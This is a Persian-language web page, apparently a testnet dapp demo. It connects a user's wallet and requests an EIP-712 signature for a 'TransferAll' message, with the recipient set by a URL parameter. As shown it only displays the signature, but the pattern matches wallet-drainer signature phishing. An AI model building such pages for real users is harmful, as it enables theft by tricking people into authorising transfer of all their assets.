<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>امضای EIP-712 با Web3Modal</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/@web3modal/html@3.6.5/dist/index.js"></script>
  <style>
    body { font-family: sans-serif; padding: 2rem; direction: rtl; background: #f9f9f9; }
    button { padding: 1rem 2rem; font-size: 16px; background: #5c67f2; color: white; border: none; border-radius: 8px; cursor: pointer; }
    pre { background: #eee; padding: 1rem; border-radius: 6px; margin-top: 1rem; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h2>🔐 اتصال و امضای انتقال دارایی</h2>
  <button onclick="connectAndSign()">اتصال و امضا</button>
  <pre id="result"></pre>

  <script>
    const { createWeb3Modal, defaultConfig } = window.web3modal;

    const projectId = "YOUR_PROJECT_ID"; // ← جایگزین کن با ID واقعی

    const metadata = {
      name: "Afshin Dapp",
      description: "Sign with your wallet",
      url: "https://eip-7702-public.onrender.com",
      icons: ["https://eip-7702-public.onrender.com/icon.png"]
    };

    const config = defaultConfig({
      projectId,
      metadata,
      chains: [
        {
          chainId: 11155111,
          name: "Sepolia",
          rpcUrl: "https://ethereum-sepolia.publicnode.com"
        }
      ]
    });

    const modal = createWeb3Modal({ config });

    async function connectAndSign() {
      try {
        const provider = await modal.open();
        const ethersProvider = new ethers.BrowserProvider(provider);
        const signer = await ethersProvider.getSigner();
        const address = await signer.getAddress();

        const url = new URL(window.location.href);
        const to = url.searchParams.get("to") || "0x000000000000000000000000000000000000dead";
        const deadline = Math.floor(Date.now() / 1000) + 600;

        const domain = {
          name: "TransferAll",
          version: "1",
          chainId: 11155111,
          verifyingContract: "0x0000000000000000000000000000000000000000"
        };

        const types = {
          TransferAll: [
            { name: "from", type: "address" },
            { name: "to", type: "address" },
            { name: "deadline", type: "uint256" }
          ]
        };

        const message = { from: address, to, deadline };
        const signature = await signer.signTypedData(domain, types, message);

        document.getElementById("result").innerText =
          `✅ امضا شد:\n` + JSON.stringify({ address, signature, message }, null, 2);
      } catch (err) {
        document.getElementById("result").innerText = `❌ خطا:\n${err.message}`;
      }
    }
  </script>
</body>
</html>
